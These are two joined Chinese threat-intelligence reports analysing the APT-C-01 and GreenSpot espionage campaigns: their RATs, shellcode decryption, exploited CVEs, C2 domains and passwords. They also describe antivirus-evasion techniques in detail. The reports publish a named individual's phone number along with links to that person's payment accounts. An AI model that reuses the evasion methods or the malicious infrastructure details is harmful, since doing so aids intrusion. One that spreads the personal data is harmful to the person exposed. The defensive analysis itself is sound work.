下载成功后，把下载的文件内容按每个字节分别和0xac，0x5c，0xdd异或解密(本质上就是直接每个字节异或0x2d)，如图：
之后把解密完的shellcode在新创建的线程中执行，如图：
C. Shellcode分析
分发域名地址托管的.tmp文件均为逐字节异或的shellcode，如下图为从分发域名下载的tinyq1detvghrt.tmp文件，该文件是和0x2d异或加密的数据。
解密后发现是Poison Ivy生成的shellcode，标志如下：
通过分析测试Poison Ivy木马生成的shellcode格式与该攻击载荷中使用的shellcode格式比较，得到每个配置字段在shellcode中的位置和含义。
其shellcode配置字段的格式详细如下：
在分析Poison Ivy中获取kernel32基址的代码逻辑时，发现其不兼容Windows 7版本系统，因为在Windows 7下InitializationOrderModule的第2个模块是KernelBase.dll，所以其获取的实际是KernelBase的基址。
由于Poison Ivy已经停止更新，所以攻击团伙为了使shellcode能够执行在后续版本的Windows系统，其采用了代码Patch对获取kernel32基址的代码做了改进。
其改进方法如下：
在原有获取kernel32基址代码前增加跳转指令跳转到shellcode尾部，其patch代码增加在尾部；
patch代码首先获取InitializationOrderModule的第2个模块的基址(WinXP下为kernel32.dll,WIN7为kernelbase.dll)；
然后获取InitializationOrderModule的第二个模块的LoadLibraryExA的地址(WinXP下的kernel32.dll和WIN7下的kernelbase.dll都有这个导出函数)
最后通过调用LoadLibraryExA函数获取kernel32的基址。
攻击者针对shellcode的patch，使得其可以在不同的Windows系统版本通用。
该shellcode的功能主要是远控木马的控制模块，和C2通信并实现远程控制。这里我们在Win7系统下模拟该木马的上线过程。
对控制域名上托管的其他shellcode文件进行解密，获得样本的上线信息统计如下：
4) 最新控制木马分析
在2018年5月，我们在该组织针对境内相关海事机构和单位的攻击活动中，发现了其使用的新的木马程序，其主要利用鱼叉邮件投递RAR自解压程序附件，当受害目标人员双击后执行。
该远控模块的入口处，通过触发异常代码，在catch里执行恶意代码，如图：
然后再用同样的方法触发异常代码，进入第二层的代码:
进入初始化套接字，并和C2建立连接的地方：
连接zxcv201789.dynssl.com的8080端口，创建C&C通道：
其中向控制服务器发送上线包的地方有上线密码:asd88，如图：
最后进入远控的功能循环部分：
0x04 关闭连接
0x41 远程shell
0x42 进程枚举
0x43 结束指定进程
0x51 枚举驱动器
0x52 列指定目录
0x53 上传文件到受害者
0x54 下载受害者的文件
0x55 删除文件
0x56 远程执行
该木马程序中的字符串用的都是反转的字符串，通过C语言的strrev把字符串反转回来，这种方式，在该组织2015年的木马中也用到过。如图：
4. C&C分析
1) 动态域名
图 38动态域名服务商（ChangeIP）
图 39动态域名服务商相关比例图
2) 域名涵义
以下是取动态域名子域名（攻击组织注册的名称），进行相关映射涵义的研究分析。
3) 云盘
酷盘相关样本目前两个Token：
我们通过对酷盘API的分析，得到攻击组织所使用的云盘帐号的信息，主要是包含一个中国移动的手机号码，该号码被用来注册云盘帐号。
{"status":"ok","email":"","phone":"15811848796","spaceQuota":1700807049216,"spaceUsed":508800279,"emailIsActive":0,"phoneIsActive":1}
以下是我们通过该手机号进行的一些关联分析结果：
图 40谷歌搜索相关结果
图 41威风堂机车网该用户信息1
图 42威风堂机车网该用户信息2
图 43手机号机主相关支付宝和微信信息
4) 第三方博客
图 44 某第三方博客部分截图
上图为毒云藤组织依托某第三方博客进行恶意代码传播。博客的域名通常在防火墙和各种安全软件的白名单里，使用这种方法将恶意代码存在博客中，可以躲避查杀和拦截。
5) C&C的IP（ASN）
图 45 C&C IP关联分析
6) 其他
非动态域名中gaewaaa.upgrinfo.com这个域名有相关whois信息，具体如下图。
图 46域名注册信息
另外一个非动态域名moneyaaa.beijingdasihei.com
5. 关联分析
1) 整体关联
从原始攻击邮件、漏洞文件、3种不同RAT（ZxShell，Poison Ivy和酷盘版）、以及相关域名、上线密码、文件扩展名、压缩包密码和关键字不同资源之间进行关联。
图 47不同资源之间整体关联
2) RAT迭代升级（对抗手法）
同源样本的典型手法：
A. 开发环境
除了XRAT后门之外，其他的版本从2007年至2015年都是用了C++开发语言。
B. 加密方法
2011、memcache版、Voice64版、HTTPBOTS版、kanbox版、PI、XRAT都使用了连续2次异的解密方式，然后执行恶意代码。另外云盘版木马在上传文件也会对文件进行相关加密方法。
图 48未知RAT2011版（左），酷盘版（右）
C. 窃密函数
ZXShell版后门使用的自定义窃取函数和2015网盘版子体使用的窃取函数非常相似。同样都排除了A盘的搜索（通常为软盘驱动器盘符）；同样都预先遍历磁盘，将盘符列表保存在内存中，通过指针加5的方式读取内存中的盘符列表。
图 49 ZxShell（左），酷盘版（右）
D. Shellcode后门
对比2011版（Poison Ivy）注入到系统的Shellcode和2015云盘版子体，可以看出使用了高度相似的Shellcode后门，上线地址尾部同样采用0x30填充。
图 50未知RAT2011版（左），酷盘版（右）
相关shellcode木马文件检出结果（0检出）：
https://www.virustotal.com/en/file/8cee670d7419d1fd0f8f0ac6a2bd981593c2c96ca0f6b8019317cf556337cfa8/analysis/
E. 子体文件名（外层）
通过对比2009版代码和和2011版代码，可以看出病毒释放的子体文件名都为~work.tmp、格式化字符串都为“%s\%s.bak”，并且代码相似度极高。
使用~tmp.tmp、~tmp.zip、~mstmp.cpt作为木马临时文件名（07~09）。
图 51未知RAT2009版（左），未知RAT2011版（右）
F. 免杀对抗–API字符串逆序对抗静态扫描：
HttpBot、酷盘、XRAT、未知RAT（07~11版）木马，代码编写过程中使用了逆序API字符串。木马执行时，通过_strrev函数将逆序字符串转换为正常API字符串，最后调用GetProcAddress函数动态获得API地址。逆序API字符串增加了字符串检测难度，使得API字符串不易被检测；除此之外，API地址是在木马动态执行中获得，在PE静态信息中很难被检测到，增加了API检测难度。
毒云藤组织已知最早从2009年开始使用此方法，并且持续到2018年仍在使用。
图 52未知RAT2009（上），酷盘（下）
G. 免杀对抗–传递错误API参数对抗动态扫描：
酷盘、Poison Ivy、XRAT、ZxShell、未知RAT（07~11版）木马，使用了GetClientRect函数对抗杀毒软件的动态扫描技术。
GetClientRect原型为：BOOL GetClientRect(HWND hWnd,LPRECT lpRect);。作用是获得窗口坐标区域。其中第1个参数为目标窗口句柄，第2个参数为返回的坐标结构。木马调用GetClientRect，故意在第一个参数传递参数为0，这样使得GetClientRect函数在正常Windows操作系统中永远执行失败，返回值为0；
目前很多杀毒软件使用了动态扫描技术（多用于启发式检测），在模拟执行GetClientRect函数时并没有考虑错误参数的情况，使得GetClientRect函数永远被模拟执行成功，返回值非0。这样一来，杀毒软件虚拟环境和用户真实系统就可以被木马区分，从而躲避杀毒软件检测。实测卡巴斯基虚拟机启发式扫描环境可以被木马检测到。
毒云藤组织已知最早从2011年开始使用此方法，并且持续到2018年仍在使用。
图 53未知RAT2011（左上），zxshell（右上），酷盘（下）
其中在酷盘使用了动态获取API的方式调用GetClientRect函数。
H. 合法数字签名
2011之前早期版本
2015BLOG版本
在2015年5月开始使用签名（疑似被盗用）
签名：We Build Toolbars LLC
第4章 幕后始作俑者
1. 资源方法
1、 漏洞文档：
（1） 主要是释放的正常DOC：繁体、或某特定地区相关字体字符等。DOC代码页
（2） 一些路径，如PPSX的DANK？
2、 PE：字符串繁体、或某特定地区相关字体字符（BIG5等）等等。PE文件版本信息。上线ID\密码\互斥量等字符串
3、 CC：
（1） 非动态域名：韦氏拼音，注册信息
（2） 动态域名：
（3） 云盘
4、 IP：或某特定地区、美国，主要区分CC的和邮件的
5、 相关作息时间：PE时间戳、文档时间等等，结论比如集中在周一上午攻击等等
2. 相关关联信息
1) 域名whois信息
域名为javainfo.upgrinfo.com，注册信息中的地址是某特定地区，相关人名使用的可能是韦氏拼音等。
2) 关注的关键字
图 54包含相关关键字代码截图
“对台”，“台”，“台湾”
漏洞文件或木马程序原始文件名（诱饵文件名）相关列表：
2012年度涉台法学研究课题材料.doc
http: //annie165.zyns.com/zxcvb.hta
stylus 本文链接： https://blogs.360.cn/post/APT_C_01.html
-- EOF --
admin001
2018-09-20 16:27:01
，添加在分类
Threat Intelligence
« Analysis and Improvement of NEO’s dBFT Consensus Mechanism
Poison Ivy Group and the Cyberespionage Campaign Against Chinese Military and Goverment »
Comments*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。 1.概述 在过去的数年时间里，安天始终警惕地监测、分析、跟踪着各种针对中国的APT攻击活动，并谨慎地披露了“海莲花”(APT-TOCS)、“白象”（White Elephant）、“方程式”（Equation）等攻击组织的活动或攻击装备分析，同时也对更多的攻击组织和行动形成了持续监测分析成果。本报告主要分析了某地缘性攻击组织在2015年前的攻击活动，安天以与该地区有一定关联的海洋生物作为了该攻击组织的名字——“绿斑”（GreenSpot）。为提升中国用户的安全意识，推动网络安全与信息化建设，安天公布这份报告。
综合来看，“绿斑”组织的攻击以互联网暴露目标和资产为攻击入口，采用社工邮件结合漏洞进行攻击，其活跃周期可能长达十年以上。 1.1 疑似的早期（2007年）攻击活动 在2007年，安天对来自该地区的网络入侵活动进行了应急响应，表1-1是在相关被攻击的服务器系统上所提取到的相关攻击载荷的主要行为和功能列表。 表 1-1 早期“绿斑”组织攻击活动相关载荷及功能列表
这些工具多数为开源或免费工具，从而形成了攻击方鲜明的DIY式的作业风格。由于这些工具多数不是专门为恶意意图所编写的恶意代码，有的还是常见的网管工具，因此反而起到了一定的“免杀”效果。但同时，这种DIY作业，并无Rootkit技术的掩护，给系统环境带来的变化较为明显，作业粒度也较为粗糙。同时只能用于控制可以被攻击跳板直接链接的节点，而无法反向链接。和其他一些APT攻击中出现的自研木马、商用木马相比，是一种相对低成本、更多依靠作业者技巧的攻击方式。 图 1-1 早期“绿斑”组织攻击活动相关载荷调用关系图 这些工具可以在被入侵环境中形成一个作业闭环。攻击者使用网络渗透手段进入目标主机后，向目标主机上传表1-1中的多种攻击载荷，利用持久化工具达成开机启动效果，实现长期驻留；通过NC开启远程Shell实现对目标主机远程命令控制；调用Mt1.exe获取系统基本信息和进一步的管理；同时攻击者可以通过Spooler.exe形成磁盘文件列表并记录、通过keylog.exe收集键盘输入并记录、通过Rar.exe收集指定的文件并打包、通过HTTP.exe开启HTTP服务，即可远程获取全盘文件列表，获取用户击键记录，回传要收集的文件和日志。
我们倾向认为，2007年前后，相关攻击组织总体上自研能力有限，对开源和免费工具比较依赖，喜好行命令作业。同时，作业风格受到类似Coolfire式的早期网络渗透攻击教程的影响较大。目前我们无法确认这一攻击事件与我们后面命名的“绿斑”组织是同一个组织，但可以确定其来自同一个来源方向。 1.2 2011-2015年攻击活动 从时间上来看，自2010年以后，该地区组织攻击能力已经有所提升，善于改良1day和陈旧漏洞进行利用，能够对公开的网络攻击程序进行定制修改，也出现了自研的网络攻击装备。2010年以后相关活动明显增多、攻击能力提升较快。
“绿斑”组织主要针对中国政府部门和航空、军事相关的科研机构进行攻击。该组织通过鱼叉式钓鱼邮件附加漏洞文档或捆绑可执行文件进行传播，主要投放RAT（Remote Administration Tool，远程管理工具）程序对目标主机进行控制和信息窃取，其典型攻击手法和流程是以邮件为载体进行传播，邮件附件中包含恶意文档，文档以MHT格式居多（MHT是MIME HTML的缩写，是一种用来保存HTML文件的格式），该文档打开后会释放并执行可执行载荷。作为迷惑用户的一种方法，嵌入在MHT中的一份起到欺骗作用的正常的文档文件也会被打开显示，攻击过程图1-2所示： 图 1-2 “绿斑”组织活动攻击流程 通过人工分析结合安天追影威胁分析系统及安天分析平台进行关联分析，我们对其攻击目标、攻击者采用的IP和常见的手法进行了梳理。该组织利用漏洞的文件是不常见的附件文件格式，相关攻击技术和手法也是经过长期准备和试验的。安天基于原始线索对该组织进行了全面跟踪、关联、分析，最终获得了近百条IoC（信标）数据。通过对事件和样本的整体分析，我们梳理了该组织在2011-2014年的部分活动时间轴。 图 1-3 “绿斑”组织2011-2014攻击活动时间轴 1.3 近期的部分攻击活动（2017年） “绿斑”组织在2015年后继续活跃，我们在2017年监测到该组织建立了一个新的传播源，该次活动的载荷都存储在同一个WEB服务器上，每一个攻击流程内的载荷都按照目录存放，其攻击流程是首先传播含有漏洞的Office文档，通过漏洞文档下载执行恶意载荷（EXE），随后通过C2对目标主机进行远程控制，具体攻击流程参见图1-4。 图 1-4 最新活动攻击流程 该WEB服务器上存放了多个不同配置的恶意脚本和可执行文件，一个目录下是一组攻击样本，最终运行的Poison Ivy ShellCode（Poison Ivy是一个远程管理工具）都会连接一个单独C2地址，图1-5中红色的域名（pps.*.com）是与2011-2015年活动相关联的C2域名。 图 1-5 传播源服务器样本部署及C&C关系图 2.攻击手法分析：通过定向社工邮件传送攻击载荷 2.1 典型案例 针对“绿斑”组织2011-2015年间的攻击活动中，安天通过监测发现和关联分析，梳理出了数十起事件和载荷的关联关系。通过对典型案例的基本信息和诱饵文件等进行分析，我们可以看出“绿斑”组织多采用通过定向社工邮件传送攻击载荷，攻击载荷有两种：一种是捆绑型PE恶意代码，在被攻击者打开执行后，其会打开嵌入在PE中的欺骗收件人的“正常”文档文件；另一种是格式攻击文档，利用漏洞CVE-2012-0158来释放并执行可执行文件，同时打开欺骗收件人的“正常”文档文件。但在两种攻击方式中，所释放的可执行文件路径和名称相同，除部分案例采用%TEMP%路径外，其他均为C:\Documents and Settings\All Users\「开始」菜单\程序\启动\update.exe，来达成开机执行的持久化效果，从释放路径、文件名称可以看出这些样本是具有关联性的（具体分析参见4.4节）。从时间上来看，使用捆绑型PE恶意代码的攻击晚于漏洞文档，这有可能是在利用漏洞文档攻击无效后，才使用了这种虽然简单粗暴但可能最有效的方式。
2.1.1 案例1 2.1.2 案例2 2.1.3 案例3 另外值得注意的地方是图2-3中相关文字内容为从“全国人民代表大会网站”（文档内容出处：“ http://www.npc.gov.cn/npc/xinwen/node_12435.htm ”2013年的网页内容，目前网页内容已更新。）页面直接复制粘贴的内容。 2.1.4 案例4 2.1.5 案例5 2.1.6 案例6 2.1.7 案例7 2.1.8 案例8 2.1.9 案例9 2.2 社工技巧分析 “绿斑”攻击组织主要针对被攻击者的职业、岗位、身份等定制文档内容，伪装成中国政府的公告、学会组织的年会文件、相关单位的通知、以及被攻击者可能感兴趣的政治、经济、军事、科研、地缘安全等内容，其所使用的欺骗性文档多数下载自中国相关部委机构、学会的网站。 3.攻击载荷分析：漏洞、后门及可执行文件 3.1 CVE-2012-0158漏洞利用 CVE-2012-0158是一个文档格式溢出漏洞，格式溢出漏洞的利用方式是在正常的文档中插入精心构造的恶意代码，从表面上看其是一个正常的文档，很难引起用户的怀疑，因此经常被用于APT攻击。CVE-2012-0158漏洞是各种APT攻击中迄今为止使用频度最高的。利用该漏洞的载体通常是RTF格式的文件，其内部数据以十六进制字符串形式保存。 3.1.1 由RTF到MHT的高级对抗 传统的CVE-2012-0158漏洞利用格式主要以RTF为主，而该组织则使用了MHT格式，这种格式同样可以触发漏洞，而且在当时一段时间内可以躲避多种杀毒软件的查杀。 图 3-1 RTF与MHT文件格式对比 如果使用RTF文件格式构造可触发漏洞的文件，在解码后会在文件中出现CLSID（CLSID是指Windows系统对于不同的应用程序、文件类型、OLE对象、特殊文件夹以及各种系统组件分配一个唯一表示它的ID代码），而新的利用方式使用MHT文件格式，CLSID会出现在MHT文件中，由于之前的RTF溢出格式嵌套DOC文档（如图3-2，红框中是DOC文档文件头），CLSID存放于嵌套的DOC文档里（如图3-3，红框中是CLSID，部分采用了网络字节序，部分采用了主机字节序）。 图 3-2 以RTF为载体的溢出文件 图 3-3 以RTF为载体的溢出文件 MHT文件格式的CLSID不会存放在嵌套的DOC里，而是直接在MHT文件中（如图3-4，红框中所示），这样可以逃避大部分安全软件的检测，而且在MHT中编码格式也发生了变化，因此如果使用以前根据RTF文件编写的CVE-2012-0158检测程序则会失效。 图 3-4 案例6涉及的MHT文件 MHT文件的主要功能是将一个离线网页的所有文件保存在一个文件中，方便浏览。将文件后缀修改为.doc后，Microsoft Word是可以正常打开的。
该文件可以分为三个部分：第一部分是一个网页；第二部分是一个base64编码的数据文件，名为“ocxstg001.mso”，该文件解码后为一个复合式文档即DOC文档；第三部分的数据是二进制文件。
在第一部分我们发现了一段这样的代码，该代码描述了第一部分和第二部分的关系也是导致漏洞触发的关键： 这段代码大致表示当网页加载的时候同时加载一个COM控件去解释第二部分的数据。该控件的CLSID是{**********-11D1-B16A-00C0F0283628}，经过查询该控件便是MSCOMCTL.OCX.。当时已知的与该控件有关的最新漏洞是CVE-2012-0158，因此可以确定这三个案例是通过精心构造MHT文件，利用漏洞CVE-2012-0158来执行，从而实现可执行文件的释放和执行。 3.1.2 值得关注漏洞载荷免杀技巧的利用 “绿斑”组织高频使用MHT漏洞格式文档的传播利用时间主要在2013年5月之前，这是一个高度值得关注的信息。我们基于对某个著名的第三方威胁情报源利用CVE-2012-0158漏洞并采用MHT文件格式的恶意代码数据进行了相关统计。 图 3-5 安天捕获部分“绿斑”免杀样本（红色）与MHT漏洞格式文档（黄色）大量出现时间的对比 从图3-5中我们可以看到，2013年3月前，MHT文件格式的CVE-2012-0158漏洞相关文件并未出现在该威胁情报源当中，但已经被“绿斑”组织使用。我们尚不能认为“绿斑”组织是这种免杀方式的发明者，但至少其是这种方式的早期使用者。而对于一个2012年1月的陈旧漏洞，“绿斑”组织则较早使用了可以延续其攻击窗口的方法。并不是所有APT攻击都会使用0day漏洞，这取决于攻击者的资源储备和突破被攻击方的防御的必要性等因素，部分APT攻击组织并没有能力去挖掘0day漏洞，但其同样试图采购获得商业的0day漏洞，针对1day漏洞快速跟进，并尝试使用免杀方式来使陈旧漏洞形成新的攻击能力。这些问题和0day漏洞检测防御一样值得关注。 3.2 CVE-2014-4114漏洞利用 我们有一定的分析证据表明，“绿斑”组织在2014年10月前曾使用CVE-2014-4114漏洞。这可能表示该组织与地下漏洞交易有相应的渠道联系。 3.3 CVE-2017-8759漏洞利用 安天2017年针对“绿斑”组织的一个新的前导攻击文档进行了分析，该文档利用最新的CVE-2017-8759漏洞下载恶意代码到目标主机执行。样本采用RTF格式而非之前的宏代码方式，在无须用户交互的情况下就可以直接下载并执行远程文件，攻击效果更好。
CVE-2017-8759漏洞是由一个换行符引发的漏洞，该漏洞影响所有主流的.NET Framework版本。在. NET库中的SOAP WSDL解析模块IsValidUrl函数没有正确处理包含回车换行符的情况，导致调用者函数PrintClientProxy存在代码注入执行漏洞，目前该漏洞主要被用于Office文档高级威胁攻击。 图 3-6 通过objautlink和objupdate控制字段自动更新链接 图 3-7 嵌入的链接实际上是一个WSDL文件（见下一节TXT文件） 3.3.1 漏洞触发文件：TXT文件 该类文件是WSDL文件，是导致漏洞触发的文件。触发漏洞会导致执行其中的代码即利用msHTA.exe执行指定的HTA文件，使用HTA文件得到解析和运行。以样本jin2.txt为例分析，关键代码如下： 图 3-8 WSDL文件调用msHTA执行HTA文件 每个txt文件的不同之处在于包含的HTA文件链接不同，具体请看表3-1： 表 3-1 txt调用hta列表
3.3.2 下载指定EXE文件：HTA文件 HTA文件是html页面文件，嵌入了VBScript脚本，该脚本的主要功能是利用PowerShell下载指定的EXE文件，保存为officeupdate.exe并执行该程序。图3-9为样本jin2.HTA的内容： 图 3-9 HTA文件调用powershell下载执行文件 每个HTA文件的不同之处是下载地址不相同，攻击者利用漏洞触发HTA下载并执行最终的可执行文件载荷，具体对应关系请看表3-2： 表 3-2 HTA对应EXE下载地址
3.4 相关载荷分析 3.4.1 Poison Ivy RAT后门 我们经过分析，发现案例1、案例2、案例3、案例9中所释放的update.exe，均为Poison Ivy RAT后门程序，Poison Ivy是一款已经公开的、著名的RAT程序，功能强大，生成的载荷小巧易于加密和对抗检测。正因Poison Ivy有这些优点，因此也被其他攻击组织使用在其他攻击事件中。以下为部分Poison Ivy后门的功能： 可以获取系统基本信息； 可以进行全盘文件管理，包括查看所有文件，下载文件，上传文件等； 获取系统进程信息，结束进程，挂起进程等； 获取系统服务程序信息； 查看系统安装的软件，可进行卸载； 获取系统打开的端口号； 可执行远程shell，执行任意命令； 可获取密码Hash值； 可进行键盘记录； 可获取屏幕截图； 可打开摄像头进行监控； 图3-10、3-11为这四个案例涉及的样本（update.exe）文件中互斥量和域名相关的信息： 图 3-10 多案例样本互斥量对比 图 3-11 多案例样本连接域名对比 同时，我们将四个案例涉及样本的版本信息、时间戳、连接域名等相关信息整理如表3-3： 表 3-3 Poison Ivy RAT后门版本信息对比
通过上面的信息，我们可以看出，在这四个案例中，虽然均为Poison Ivy RAT的后门，但是还可以分为三类：
第一类是案例1和案例2，它们之间除域名外，其它信息均相同，通过对案例1和案例2中update.exe二进制的对比，发现它们之间90%的二进制是相同的，不同之处是加密的二进制代码，它们的不同是由于加密密钥的不同。 图 3-12 案例1、2涉及样本的解密算法 第二类是案例3，第三类是案例9，这两类样本的加密算法与第一类不同，但解密后的代码，除了相关配置不同，其功能部分几乎完全相同。 图 3-13 案例3涉及样本的解密算法 图 3-14 案例9涉及样本的解密算法 根据案例3中update.exe的时间戳，我们可以判断该样本出现于2013年2月6日，虽然时间戳是可以被修改的，但是结合案例3释放的欺骗文档的内容（请参见第2章，doc中内容的时间），我们相信它具有一定的参考价值。 3.4.2 Gh0st后门 通过我们对于案例4中update.exe的分析，得到该样本所使用的互斥量为“chinaheikee__inderjns”，该互斥量与我们分析过的gh0st样本的互斥量一致，是默认配置，而且上线数据包与gh0st 3.75版本非常一致，因此我们可以判定该update.exe为gh0st后门。 图 3-15 Gh0st RAT后门界面 3.4.3 HttpBots后门 通过我们对于案例5中svchost.exe的分析，可以确定该样本实际是一个BOT后门程序。svchost.exe通过Web端来控制安装有该后门程序的机器，图3-16为具体指令信息截图。 图 3-16 httpbots后门控制指令 表 3-4 指令说明
3.4.4 ZXSHELL后门（针对性） 经过安天分析，案例6、7、8中释放的PE文件确定为ZXShell后门家族（分别为3个不同版本），是使用ZXShell源码修改后编译的，具有ZXShell后门常规功能：系统信息获取、文件管理、进程查看等。
很特别的一点是作者将版本修改为V3.6（ZXShell最后更新版本为3.0），并新增了窃密功能：样本收集*.doc*、*.xls*、*.ppt*等文档文件（案例6只收集网络磁盘、U盘、CDROM中的文件，案例7-8则收集全盘文件），且为保证收集的文档具有价值，只收集半年内修改过的文档文件并使用RAR打包，以日期加磁盘卷序列号命名（案例6以磁盘卷序列号命名），后缀名和压缩包密码各不相同。 图 3-17 案例6只收集U盘、CD、网络磁盘中的文件 图 3-18 打包收集到的文档 根据已有样本分析配置后，我们统计出样本搜集文档的类型：*.doc*、*.xls*、*.ppt*、*.wps*、*.pdf。
经分析，我们发现了样本新增的功能：
1. 获取IE自动保存的邮箱账户密码和对应网址，对IE6和IE6以上的版本采取不同的方法。
2. 收集网络信息、主机信息、进程信息，记录在如下目录中：
%Application Data%\Microsoft\Windows\Profiles.log
3. 样本根据各自的配置，收集全盘包含指定关键字的文件路径、C盘Program Files目录下的EXE文件路径，将收集到的文件路径信息同样记录在
%Application Data\Microsoft\Windows\Profiles.log 图 3-19 收集指定关键文件列表 根据目前已捕获样本，我们发现每个样本都硬编码了三个关键字，根据关键字对攻击目标进行敏感资料收集，去重后的具体关键字为十二个，包括“战”、“军”、“航”等，通过这些关键字我们可以清晰的了解“绿斑”组织的作业意图：
4. 样本存在一个额外域名，自动回传Profiles.log文件和RAR打包文件。
5. 后门发包：***_IP-计算机名^^//@@&&***（“***”部分各个样本不同）
6. 监听回应：kwo（口令）
7. 后门发包：IP-计算机名-2014010106.tmpp19769（年月日小时.tmpp文件大小）
8. 监听回应：任意（支持以指定偏移读取文件）
9. 后门发包：Profiles.log文件内容（参见图3-20） 图 3-20 Profiles.log文件内容 10. 案例6样本中，指令的帮助提示为正常中文，而案例8样本是乱码，经过分析，发现新样本其实对这部分中文是其他编码，而在编译程序时候却将这部分转换为GB2312编码，导致显示乱码。 图 3-21 案例6样本指令提示 图 3-22 案例8样本指令提示 11. 案例7样本对中国安全厂商产品的相关进程的判断，根据安装不同的杀软，采取退出、正常运行、添加特殊启动项等不同的行为，可以看出这是针对中国用户专门设计的恶意程序。
表3-5是该组织使用的样本与ZXShell原版功能的对比，可以发现这批样本只保留了必要的远控功能，并添加了ZXShell原本没有的窃密相关功能，具体功能对比如表3-5所示： 表 3-5 案例6、7、8样本与 ZXShell RAT原版后门对比
3.4.5 攻击期间部分样本的检出情况 事件中的后门样本均是互联网公开的RAT程序，一般而言安全厂商对这些程序都会重点关注，基本主流安全厂商都可以检测和查杀，但是该组织对这些公开的RAT程序进行修改和加密使用，使这些样本在其行动的一段时间内的整体检出率不到8%，一些个别样本甚至只有1-2家安全厂商检出，可见这批样本是针对杀软做了针对性的免杀处理的，可以在目标主机持续化驻留。 图 3-23 部分样本检出率 3.4.6 近期捕获样本分析 3.4.6.1 EXE文件 EXE文件是3.3.2章节中提到的由HTA文件下载并执行的最终载荷，该类文件主要功能是从指定网址下载ShellCode，解密之后，创建线程执行此ShellCode。以jin2.exe为例分析，样本关键代码如下： 图 3-24 连接指定网址下载ShellCode 图 3-25 解密shellcode函数 从指定网址下载完ShellCode后，样本对ShellCode进行解密，然后分配内存将解密后的ShellCode复制过去。随后创建一个线程，将ShellCode的首地址作为参数传给线程函数从而运行ShellCode。 图 3-26 分配内存，创建线程执行ShellCode 每个EXE文件功能代码基本相同，只有下载ShellCode的地址不同的，各个地址如下表所示： 表 3-6 EXE文件下载shellcode对应列表
3.4.6.2 ShellCode（Poison Ivy） 我们对解密后的ShellCode进行分析，发现其ShellCode为Poison Ivy程序生成，与3.4.1章节的样本来自同一远控程序。在传播源放置的不同ShellCode中所连接的IP地址如表3-7所示： 表 3-7 shellcode连接c2对应列表
我们通过本地劫持的方式，将C2地址重定向到本地计算机，通过配置好的Poison Ivy客户端可以与样本建立连接，确定攻击者使用的Poison Ivy版本为2.3.1，具体信息如图3-27所示： 图 3-27 重定向C2成功连接分析的样本 4.样本关联性分析 4.1 多案例横向关联 安天CERT对典型案例中的前6个案例的相关信息进行了关联分析，主要涉及文件名、互斥量、文件版本信息等，通过横向关联（参见图4-1）以及之前提到的doc文件内容、漏洞利用方式、可执行文件的相关信息，我们初步判定这些事件之间是存在关联的。 图 4-1 多案例横向关联 4.1.1 ShellCode部分（CVE-2012-0158）对比 表 4-1 ShellCode部分（CVE-2012-0158）对比
4.1.2 释放的PE文件对比 表 4-2 释放的PE文件对比
4.2 域名关联 通过提取和整理十几个有关联样本中的域名信息（参见图4-2），我们可以很清晰地看出，所有域名均为动态域名，且服务提供商均处于境外，同时大部分域名都是通过changeip.com和no-ip.com注册的，我们认为这些域名并非单一散乱注册的，而是属于同一来源的、有组织的进行注册。 图 4-2 行动涉及域名信息 4.3 IP地址关联 通过提取和整理十几个有关联样本中域名的曾跳转IP和现跳转IP，我们可以很清晰地看出，在所有的IP地址中，绝大多数的IP地址都属于同一地区，并且这些IP多数来自两个互联网地址分派机构AS3462、和AS18182，每个互联网地址分派机构管理现实中的一个区域，这也同时说明了这是一组有相同来源的攻击事件。 4.4 恶意代码之间关联性 为了方便呈现和理解，我们对典型案例中所有的样本、C2的关联性进行了关系梳理（参见图4-3）。 图 4-3 恶意代码之间关联图（2011-2015年活动） 通过研究发现，虽然“绿斑”组织使用了多种不同的后门程序，但是它们之间共用了C2服务器，这很有可能是为了方便管理与控制，这一点从表4-3的后门ID与上线密码也可以发现不同后门类型之间的对应关系。 图 4-4 不同事件/恶意载荷（PE）共用基础设施C2 通过对Poison Ivy RAT相关样本分析，我们得出其上线ID和密码。我们可以看到其中有不同的样本均采用了同样的ID和密码。 表 4-3 Poison Ivy RAT上线ID和密码
通过对已捕获的ZXShell RAT相关样本进行分析，我们统计出样本的上线密码和压缩包加密密码。可以看出ZXShell样本中也有很多采用了相同的密码，同时这些密码与表4-3（Poison Ivy RAT上线ID和密码）中的密码也有一些相同或者相似，再通过域名、IP等其他信息可以认为这些样本为同一攻击组织所为。 表 4-4 ZXShell RAT上线密码和压缩配置
5.组织关联性分析 除以上样本分析中所呈现的较为直接的多起事件的关联性外，安天CERT还进行了对比分析，从代码相似性、域名使用偏好、C2的IP地址关联性及地理位置特性等方面得出了这些载荷均来自“绿斑”攻击组织的结论。 5.1 代码相似性 在2011-2015的行动中，攻击组织使用了4类远程控制程序，其中主要使用ZXShell和Poison Ivy。在对于Poison Ivy的使用中，攻击组织首先生成Poison Ivy 的ShellCode，然后对ShellCode异或加密硬编码到Loader中，在Loader投放到目标主机后解密执行ShellCode。这种手法与2017年所发现行动中的样本完全相同，且都是采用三次异或加密，样本解密算法代码对比参见图5-1。 图 5-1 左图为2011-2015年行动中样本解密算法，右图为2017年行动样本解密算法 5.2 域名使用偏好 在2017年发现的行动中全部使用了动态域名商（共计14个），而在2011-2015年的行动中则使用了35个动态域名商。可以发现两起行动的攻击者都偏好使用动态域名，同时本次行动中有7个动态域名商与历史行动涉及的域名商相同。
另外，在此次事件中的一个域名“geiwoaaa.xxx.com”与2013年事件中的域名“givemea.xxx.com”释义相似度较高，我们猜测很可能是同一组织注册。 5.3 C2的IP地址关联性 通过对两次行动中C2的IP地址进行关联分析，我们发现在2017年行动中的样本的C2（uswebmail163.xxx.com和l63service.xxx.com）解析到同一个IP：45.77.xxx.xxx，而在2011-2015年行动中涉及的pps.xxx.com这个域名也曾指向这个IP。 图 5-2 关联到2013年行动中的C2域名 5.4 地理位置特性 在2017年行动中的一个域名“geiwoaaa.xxx.com”与2011-2015年行动可能存在某种关联，因为该域名解析的IP（114.42.XXX.XXX）地理位置与早期活动涉及的地理位置相同（其他IP地址多为美国），这可能是攻击者早期测试遗留的，而这个IP与2013年行动都属于亚洲某地区电信的114.42段，在我们的监控中发现2013年行动中C2地址多为这个IP段内，这表示两起行动的攻击组织可能存在密切联系。同时该地区电信相关网站资料显示：“114.32.XXX.XXX - 114.47.XXX.XXX非固定浮动IP”，这说明该段内IP地址为动态分配IP，一定区域内在此电信运营商办理网络业务的用户都可能被分配到该IP地址，这表示可能两次行动的攻击者所在位置相近或者采用的跳板位置相近。 图 5-3 